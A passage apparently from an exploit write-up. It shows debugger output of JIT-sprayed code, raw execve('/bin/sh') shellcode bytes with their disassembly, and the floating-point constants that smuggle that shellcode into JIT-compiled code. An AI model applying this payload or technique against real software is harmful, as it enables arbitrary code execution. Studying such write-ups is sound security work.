gef➤  x/32i 0x6915065ab40 + 0x2d - 2
   0x6915065ab6b:	movabs r10,0xbeb909090583b6a
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
   0x6915065ac14:	mov    eax,0x2a
   0x6915065ac19:	mov    rsp,rbp
   0x6915065ac1c:	pop    rbp
   0x6915065ac1d:	ret
   0x6915065ac1e:	call   0x6915065a300
```

Skip the opcode:

```shell
gef➤  x/32i 0x6915065ab40 + 0x2d
   0x6915065ab6d:	push   0x3b
   0x6915065ab6f:	pop    rax
   0x6915065ab70:	nop
   0x6915065ab71:	nop
   0x6915065ab72:	nop
   0x6915065ab73:	jmp    0x6915065ab80
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
```

The original shellcode:

```c
0x6a	0x3b	0x58	0x90	0x90	0x90	0xeb	0x0b
0x68	0x2f	0x73	0x68	0x00	0x5b	0xeb	0x0b
0x68	0x2f	0x62	0x69	0x6e	0x59	0xeb	0x0b
0x48	0xc1	0xe3	0x20	0x90	0x90	0xeb	0x0b
0x48	0x01	0xcb	0x53	0x90	0x90	0xeb	0x0b
0x48	0x89	0xe7	0x90	0x90	0x90	0xeb	0x0b
0x48	0x31	0xf6	0x48	0x31	0xd2	0xeb	0x0b
0x0f	0x05	0x90	0x90	0x90	0x90	0xeb	0x0b
```

Disassemble the shellcode:

```c
   0:  6a 3b                push   0x3b
   2:  58                   pop    eax
   3:  90                   nop
   4:  90                   nop
   5:  90                   nop
   6:  eb 0b                jmp    0x13
   8:  68 2f 73 68 00       push   0x68732f
   d:  5b                   pop    ebx
   e:  eb 0b                jmp    0x1b
  10:  68 2f 62 69 6e       push   0x6e69622f
  15:  59                   pop    ecx
  16:  eb 0b                jmp    0x23
  18:  48                   dec    eax
  19:  c1 e3 20             shl    ebx, 0x20
  1c:  90                   nop
  1d:  90                   nop
  1e:  eb 0b                jmp    0x2b
  20:  48                   dec    eax
  21:  01 cb                add    ebx, ecx
  23:  53                   push   ebx
  24:  90                   nop
  25:  90                   nop
  26:  eb 0b                jmp    0x33
  28:  48                   dec    eax
  29:  89 e7                mov    edi, esp
  2b:  90                   nop
  2c:  90                   nop
  2d:  90                   nop
  2e:  eb 0b                jmp    0x3b
  30:  48                   dec    eax
  31:  31 f6                xor    esi, esi
  33:  48                   dec    eax
  34:  31 d2                xor    edx, edx
  36:  eb 0b                jmp    0x43
  38:  0f 05                syscall
  3a:  90                   nop
  3b:  90                   nop
  3c:  90                   nop
  3d:  90                   nop
  3e:  eb 0b                jmp    0x4b
```

The floating constant representation of the shellcode:

```c
gef➤  p/f 0x6a3b58909090eb0b
$7 = 5.3585858754573572e+203
gef➤  p/f 0x682f7368005beb0b
$8 = 7.1746216658151689e+193
gef➤  p/f 0x682f62696e59eb0b
$9 = 7.1594779136462801e+193
gef➤  p/f 0x48c1e3209090eb0b
$10 = 3.116392488113758e+42
gef➤  p/f 0x4801cb539090eb0b
$11 = 7.5688342669851635e+38
gef➤  p/f 0x4889e7909090eb0b
$12 = 2.8207556681427158e+41
gef➤  p/f 0x4831f64831d2eb0b
$13 = 6.1121651805415847e+39
gef➤  p/f 0x0f0590909090eb0b
$14 = 2.6493354561113691e-236
```